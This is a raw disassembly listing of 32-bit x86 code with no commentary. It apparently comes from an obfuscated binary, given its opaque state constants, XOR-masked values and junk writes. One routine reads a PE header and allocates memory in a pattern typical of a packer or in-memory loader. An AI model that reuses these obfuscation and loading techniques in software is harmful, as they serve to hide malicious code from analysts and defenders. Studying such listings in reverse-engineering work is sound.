  422eec:	mov    ecx,DWORD PTR [ebp+0x8]
  422eef:	xor    ecx,edi
  422ef1:	add    ecx,ebx
  422ef3:	mov    DWORD PTR [ebp-0x18],ecx
  422ef6:	jmp    0x4230f2
  422efb:	cmp    eax,0xf89c85bb
  422f00:	je     0x423104
  422f06:	mov    ecx,DWORD PTR [ebp-0x8]
  422f09:	xor    ecx,edi
  422f0b:	mov    esi,eax
  422f0d:	add    ecx,ebx
  422f0f:	mov    DWORD PTR [ebp+0x18],ecx
  422f12:	mov    eax,DWORD PTR [ebp-0x18]
  422f15:	xor    esi,edi
  422f17:	lea    eax,[eax+esi*1+0x3272fa]
  422f1e:	mov    DWORD PTR [ebp-0x18],eax
  422f21:	mov    eax,DWORD PTR [ebp-0x8]
  422f24:	mov    ecx,DWORD PTR [ebp-0x18]
  422f27:	xor    eax,edi
  422f29:	add    eax,ebx
  422f2b:	cmp    ecx,eax
  422f2d:	jne    0x422f42
  422f2f:	mov    eax,DWORD PTR [ebp+0x8]
  422f32:	xor    eax,edi
  422f34:	add    eax,ebx
  422f36:	push   eax
  422f37:	push   0xc
  422f39:	lea    eax,[ebp-0x4c]
  422f3c:	push   eax
  422f3d:	call   0x4229f5
  422f42:	mov    eax,DWORD PTR [ebp-0xc]
  422f45:	mov    eax,DWORD PTR [eax]
  422f47:	xor    eax,edi
  422f49:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f50:	mov    ecx,DWORD PTR [ebp+0x8]
  422f53:	xor    ecx,edi
  422f55:	movzx  eax,al
  422f58:	add    ecx,ebx
  422f5a:	cmp    eax,ecx
  422f5c:	je     0x4230da
  422f62:	mov    eax,DWORD PTR [ebp-0x10]
  422f65:	mov    eax,DWORD PTR [eax]
  422f67:	xor    eax,edi
  422f69:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f70:	mov    ecx,DWORD PTR [ebp+0x8]
  422f73:	xor    ecx,edi
  422f75:	movzx  eax,al
  422f78:	add    ecx,ebx
  422f7a:	cmp    eax,ecx
  422f7c:	je     0x4230da
  422f82:	mov    eax,DWORD PTR [ebp+0xc]
  422f85:	mov    eax,DWORD PTR [eax]
  422f87:	xor    eax,edi
  422f89:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422f90:	mov    ecx,DWORD PTR [ebp+0x8]
  422f93:	xor    ecx,edi
  422f95:	movzx  eax,al
  422f98:	add    ecx,ebx
  422f9a:	cmp    eax,ecx
  422f9c:	je     0x4230da
  422fa2:	mov    eax,DWORD PTR [ebp-0x14]
  422fa5:	mov    eax,DWORD PTR [eax]
  422fa7:	xor    eax,edi
  422fa9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fb0:	mov    ecx,DWORD PTR [ebp+0x8]
  422fb3:	xor    ecx,edi
  422fb5:	movzx  eax,al
  422fb8:	add    ecx,ebx
  422fba:	cmp    eax,ecx
  422fbc:	je     0x4230da
  422fc2:	mov    eax,DWORD PTR [ebp-0x10]
  422fc5:	mov    eax,DWORD PTR [eax]
  422fc7:	xor    eax,edi
  422fc9:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  422fd0:	mov    ecx,DWORD PTR [ebp-0xc]
  422fd3:	mov    ecx,DWORD PTR [ecx]
  422fd5:	xor    ecx,edi
  422fd7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fde:	xor    al,cl
  422fe0:	mov    ecx,DWORD PTR [ebp+0xc]
  422fe3:	mov    ecx,DWORD PTR [ecx]
  422fe5:	xor    ecx,edi
  422fe7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  422fee:	or     al,cl
  422ff0:	mov    ecx,DWORD PTR [ebp-0xc]
  422ff3:	mov    ecx,DWORD PTR [ecx]
  422ff5:	xor    ecx,edi
  422ff7:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  422ffe:	cmp    cl,al
  423000:	jne    0x4230da
  423006:	mov    eax,DWORD PTR [ebp+0xc]
  423009:	mov    eax,DWORD PTR [eax]
  42300b:	xor    eax,edi
  42300d:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423014:	mov    ecx,DWORD PTR [ebp-0x10]
  423017:	mov    ecx,DWORD PTR [ecx]
  423019:	xor    ecx,edi
  42301b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423022:	xor    al,cl
  423024:	mov    ecx,DWORD PTR [ebp-0x14]
  423027:	mov    ecx,DWORD PTR [ecx]
  423029:	xor    ecx,edi
  42302b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423032:	or     al,cl
  423034:	mov    ecx,DWORD PTR [ebp-0x10]
  423037:	mov    ecx,DWORD PTR [ecx]
  423039:	xor    ecx,edi
  42303b:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423042:	cmp    cl,al
  423044:	jne    0x4230da
  42304a:	mov    eax,DWORD PTR [ebp-0x14]
  42304d:	mov    eax,DWORD PTR [eax]
  42304f:	xor    eax,edi
  423051:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423058:	mov    ecx,DWORD PTR [ebp+0xc]
  42305b:	mov    ecx,DWORD PTR [ecx]
  42305d:	xor    ecx,edi
  42305f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423066:	xor    al,cl
  423068:	mov    ecx,DWORD PTR [ebp-0xc]
  42306b:	mov    ecx,DWORD PTR [ecx]
  42306d:	xor    ecx,edi
  42306f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  423076:	or     al,cl
  423078:	mov    ecx,DWORD PTR [ebp+0xc]
  42307b:	mov    ecx,DWORD PTR [ecx]
  42307d:	xor    ecx,edi
  42307f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  423086:	cmp    cl,al
  423088:	jne    0x4230da
  42308a:	mov    eax,DWORD PTR [ebp-0x14]
  42308d:	mov    eax,DWORD PTR [eax]
  42308f:	xor    eax,edi
  423091:	mov    al,BYTE PTR [ebp+eax*1+0x3272ae]
  423098:	mov    ecx,DWORD PTR [ebp-0xc]
  42309b:	mov    ecx,DWORD PTR [ecx]
  42309d:	xor    ecx,edi
  42309f:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230a6:	xor    al,cl
  4230a8:	mov    ecx,DWORD PTR [ebp-0x10]
  4230ab:	mov    ecx,DWORD PTR [ecx]
  4230ad:	xor    ecx,edi
  4230af:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272ae]
  4230b6:	or     al,cl
  4230b8:	mov    ecx,DWORD PTR [ebp-0x14]
  4230bb:	mov    ecx,DWORD PTR [ecx]
  4230bd:	xor    ecx,edi
  4230bf:	mov    cl,BYTE PTR [ebp+ecx*1+0x3272b2]
  4230c6:	cmp    cl,al
  4230c8:	jne    0x4230da
  4230ca:	lea    eax,[ebp-0x4c]
  4230cd:	push   eax
  4230ce:	call   0x422b95
  4230d3:	mov    ecx,DWORD PTR [ebp-0x44]
  4230d6:	cmp    eax,ecx
  4230d8:	je     0x4230e4
  4230da:	mov    eax,DWORD PTR [ebp+0x8]
  4230dd:	xor    eax,edi
  4230df:	add    eax,ebx
  4230e1:	mov    DWORD PTR [ebp+0x18],eax
  4230e4:	mov    eax,DWORD PTR [ebp-0x8]
  4230e7:	xor    eax,edi
  4230e9:	lea    eax,[eax+esi*1+0x3272fa]
  4230f0:	xor    eax,edi
  4230f2:	mov    ecx,DWORD PTR [ebp+0x8]
  4230f5:	mov    edx,DWORD PTR [ebp+0x18]
  4230f8:	xor    ecx,edi
  4230fa:	add    ecx,ebx
  4230fc:	cmp    edx,ecx
  4230fe:	je     0x422efb
  423104:	mov    eax,DWORD PTR [ebp+0x8]
  423107:	mov    ecx,DWORD PTR [ebp+0x18]
  42310a:	xor    eax,edi
  42310c:	add    eax,ebx
  42310e:	cmp    ecx,eax
  423110:	jne    0x423123
  423112:	mov    eax,DWORD PTR [ebp-0x8]
  423115:	mov    ecx,DWORD PTR [ebp+0x1c]
  423118:	xor    eax,edi
  42311a:	lea    eax,[eax+ecx*1+0x3272fa]
  423121:	jmp    0x42319a
  423123:	push   0x18
  423125:	push   DWORD PTR [ebp-0x4]
  423128:	lea    eax,[ebp-0x64]
  42312b:	push   eax
  42312c:	call   0x42240f
  423131:	mov    eax,DWORD PTR [ebp+0x8]
  423134:	mov    ecx,DWORD PTR [ebp-0x18]
  423137:	xor    eax,edi
  423139:	add    eax,ebx
  42313b:	cmp    eax,ecx
  42313d:	je     0x423152
  42313f:	mov    eax,DWORD PTR [ebp+0x8]
  423142:	xor    eax,edi
  423144:	add    eax,ebx
  423146:	push   eax
  423147:	push   0x18
  423149:	lea    eax,[ebp-0x64]
  42314c:	push   eax
  42314d:	call   0x4229f5
  423152:	mov    eax,DWORD PTR [ebp-0x4]
  423155:	add    eax,0x18
  423158:	mov    DWORD PTR [ebp+0x18],eax
  42315b:	push   DWORD PTR [ebp-0x50]
  42315e:	push   DWORD PTR [ebp+0x18]
  423161:	mov    eax,DWORD PTR [ebp-0x54]
  423164:	add    eax,DWORD PTR [ebp-0x20]
  423167:	push   eax
  423168:	call   0x42240f
  42316d:	mov    eax,DWORD PTR [ebp+0x8]
  423170:	mov    ecx,DWORD PTR [ebp-0x18]
  423173:	xor    eax,edi
  423175:	add    eax,ebx
  423177:	cmp    eax,ecx
  423179:	je     0x42318c
  42317b:	push   0x0
  42317d:	push   DWORD PTR [ebp-0x50]
  423180:	mov    eax,DWORD PTR [ebp-0x54]
  423183:	add    eax,DWORD PTR [ebp-0x20]
  423186:	push   eax
  423187:	call   0x4229f5
  42318c:	mov    eax,DWORD PTR [ebp-0x24]
  42318f:	mov    ecx,DWORD PTR [ebp-0x50]
  423192:	add    DWORD PTR [eax],ecx
  423194:	mov    eax,DWORD PTR [ebp-0x50]
  423197:	add    eax,DWORD PTR [ebp+0x1c]
  42319a:	mov    DWORD PTR [ebp+0x1c],eax
  42319d:	mov    eax,DWORD PTR [ebp-0x8]
  4231a0:	mov    ecx,DWORD PTR [ebp+0x1c]
  4231a3:	xor    eax,edi
  4231a5:	add    eax,ebx
  4231a7:	imul   eax,ecx
  4231aa:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ad:	mov    edx,DWORD PTR [ebp-0x28]
  4231b0:	xor    ecx,edi
  4231b2:	lea    ecx,[ecx+edx*1+0x3272fa]
  4231b9:	cmp    eax,ecx
  4231bb:	jb     0x422e19
  4231c1:	mov    esi,DWORD PTR [ebp+0x14]
  4231c4:	mov    eax,DWORD PTR [ebp-0x20]
  4231c7:	mov    DWORD PTR [esi],eax
  4231c9:	jmp    0x423210
  4231cb:	mov    ecx,DWORD PTR [ebp+0x8]
  4231ce:	mov    edx,DWORD PTR [ebp+0xc]
  4231d1:	xor    ecx,edi
  4231d3:	xor    edx,edi
  4231d5:	add    ecx,ebx
  4231d7:	add    edx,ebx
  4231d9:	cmp    ecx,edx
  4231db:	jne    0x4231ef
  4231dd:	mov    eax,ds:0x7f642dde
  4231e2:	imul   eax,eax,0x9f15fcef
  4231e8:	mov    ds:0x7f642dde,eax
  4231ed:	jmp    0x423210
  4231ef:	mov    ecx,DWORD PTR [ebp+0x8]
  4231f2:	xor    ecx,edi
  4231f4:	add    ecx,ebx
  4231f6:	cmp    eax,ecx
  4231f8:	je     0x423206
  4231fa:	sub    DWORD PTR ds:0xf861e3e,0x709beac2
  423204:	jmp    0x423210
  423206:	and    DWORD PTR ds:0x3343fade,0x5265ec3f
  423210:	pop    edi
  423211:	pop    esi
  423212:	pop    ebx
  423213:	leave  
  423214:	ret    0x18
  423217:	push   ebp
  423218:	mov    ebp,esp
  42321a:	and    esp,0xfffffff8
  42321d:	mov    eax,DWORD PTR [ebp+0x20]
  423220:	sub    esp,0x14
  423223:	push   ebx
  423224:	mov    ebx,DWORD PTR [ebp+0x14]
  423227:	push   esi
  423228:	push   edi
  423229:	cmp    eax,0xf89c85b5
  42322e:	jne    0x42323a
  423230:	push   0xf89c85b4
  423235:	jmp    0x42336c
  42323a:	mov    eax,DWORD PTR [ebp+0x20]
  42323d:	cmp    eax,0xf89c85b4
  423242:	jne    0x42324e
  423244:	push   0xf89c85bb
  423249:	jmp    0x42336c
  42324e:	mov    eax,DWORD PTR [ebp+0x20]
  423251:	cmp    eax,0xf89c85bb
  423256:	jne    0x423262
  423258:	push   0xf89c85ba
  42325d:	jmp    0x42336c
  423262:	mov    eax,DWORD PTR [ebp+0x20]
  423265:	cmp    eax,0xf89c85ba
  42326a:	jne    0x423276
  42326c:	push   0xf89c85b9
  423271:	jmp    0x42336c
  423276:	mov    ecx,DWORD PTR [ebp+0x20]
  423279:	mov    eax,0xf89c85be
  42327e:	cmp    ecx,eax
  423280:	jne    0x42333c
  423286:	mov    eax,DWORD PTR [ebp+0x10]
  423289:	mov    DWORD PTR [esp+0xc],eax
  42328d:	mov    eax,DWORD PTR [ebp+0x18]
  423290:	mov    DWORD PTR [esp+0x14],eax
  423294:	mov    eax,DWORD PTR [ebp+0xc]
  423297:	mov    DWORD PTR [esp+0x18],eax
  42329b:	mov    eax,DWORD PTR [ebp+0x8]
  42329e:	mov    DWORD PTR [esp+0x10],eax
  4232a2:	mov    eax,DWORD PTR [esp+0x10]
  4232a6:	mov    ecx,DWORD PTR [esp+0x14]
  4232aa:	mov    edi,0x75108b3
  4232af:	xor    eax,edi
  4232b1:	mov    esi,0x3272fa
  4232b6:	add    eax,esi
  4232b8:	mov    DWORD PTR [ecx],eax
  4232ba:	mov    eax,DWORD PTR [esp+0xc]
  4232be:	mov    eax,DWORD PTR [eax+0x194]
  4232c4:	mov    ecx,DWORD PTR [eax]
  4232c6:	mov    eax,DWORD PTR [esp+0xc]
  4232ca:	mov    eax,DWORD PTR [eax+0x194]
  4232d0:	mov    eax,DWORD PTR [eax]
  4232d2:	add    eax,DWORD PTR [ecx+0x3c]
  4232d5:	mov    ecx,DWORD PTR [esp+0xc]
  4232d9:	mov    ecx,DWORD PTR [ecx+0x1e0]
  4232df:	mov    ecx,DWORD PTR [ecx+0x14]
  4232e2:	push   0x4
  4232e4:	push   0x3000
  4232e9:	push   DWORD PTR [eax+0x50]
  4232ec:	push   0x0
  4232ee:	call   ecx
  4232f0:	mov    DWORD PTR [ebx],eax
  4232f2:	mov    eax,DWORD PTR [esp+0x10]
  4232f6:	push   DWORD PTR [esp+0xc]
  4232fa:	xor    eax,edi
  4232fc:	add    eax,esi
  4232fe:	mov    DWORD PTR [esp+0x20],eax
  423302:	lea    eax,[esp+0x20]
  423306:	push   eax
  423307:	push   ebx
  423308:	push   DWORD PTR [esp+0x20]
  42330c:	push   DWORD PTR [esp+0x28]
  423310:	push   DWORD PTR [esp+0x24]
  423314:	call   0x422cd9
  423319:	mov    eax,DWORD PTR [esp+0x10]
  42331d:	mov    ecx,DWORD PTR [ebx]
  42331f:	xor    eax,edi
  423321:	add    eax,esi
  423323:	cmp    ecx,eax
  423325:	je     0x423383
  423327:	mov    eax,DWORD PTR [esp+0x18]
  42332b:	mov    ecx,DWORD PTR [esp+0x14]
  42332f:	xor    eax,edi
  423331:	add    eax,esi
  423333:	imul   eax,DWORD PTR [esp+0x1c]
  423338:	mov    DWORD PTR [ecx],eax
  42333a:	jmp    0x423383
  42333c:	mov    ecx,DWORD PTR [ebp+0x20]
  42333f:	cmp    ecx,0xf89c85b9
  423345:	jne    0x42334e
  423347:	push   0xf89c85b8
  42334c:	jmp    0x42336c
  42334e:	mov    ecx,DWORD PTR [ebp+0x20]
  423351:	cmp    ecx,0xf89c85b8
  423357:	jne    0x423360
  423359:	push   0xf89c85bf
  42335e:	jmp    0x42336c
  423360:	mov    ecx,DWORD PTR [ebp+0x20]
  423363:	cmp    ecx,0xf89c85bf
  423369:	jne    0x423383
  42336b:	push   eax
  42336c:	push   DWORD PTR [ebp+0x1c]
  42336f:	push   DWORD PTR [ebp+0x18]
  423372:	push   ebx
  423373:	push   DWORD PTR [ebp+0x10]
  423376:	push   DWORD PTR [ebp+0xc]
  423379:	push   DWORD PTR [ebp+0x8]
  42337c:	call   0x423217
  423381:	mov    DWORD PTR [ebx],eax
  423383:	mov    eax,DWORD PTR [ebx]
  423385:	pop    edi
  423386:	pop    esi
  423387:	pop    ebx
  423388:	mov    esp,ebp
  42338a:	pop    ebp
  42338b:	ret    0x1c
  42338e:	push   ebp
  42338f:	mov    ebp,esp
  423391:	sub    esp,0xc
  423394:	mov    eax,0xf89c85b5
  423399:	mov    DWORD PTR [ebp-0x8],eax
  42339c:	mov    DWORD PTR [ebp-0xc],0xf89c85b4
  4233a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4233a6:	xor    ecx,0x75108b3
  4233ac:	add    ecx,0x3272fa
  4233b2:	mov    DWORD PTR [ebp-0x4],ecx
  4233b5:	mov    ecx,DWORD PTR [ebp+0xc]
  4233b8:	push   eax
  4233b9:	mov    DWORD PTR [ebp+0xc],ecx
  4233bc:	push   DWORD PTR [ebp+0xc]
  4233bf:	lea    eax,[ebp-0x4]
  4233c2:	push   DWORD PTR [ebp+0x8]
  4233c5:	push   eax
  4233c6:	push   DWORD PTR [ebp+0xc]
  4233c9:	push   DWORD PTR [ebp-0xc]
  4233cc:	push   DWORD PTR [ebp-0x8]
  4233cf:	call   0x423217
  4233d4:	mov    DWORD PTR [ebp-0x4],eax
  4233d7:	mov    eax,DWORD PTR [ebp-0x4]
  4233da:	leave  
  4233db:	ret    0x8
	...
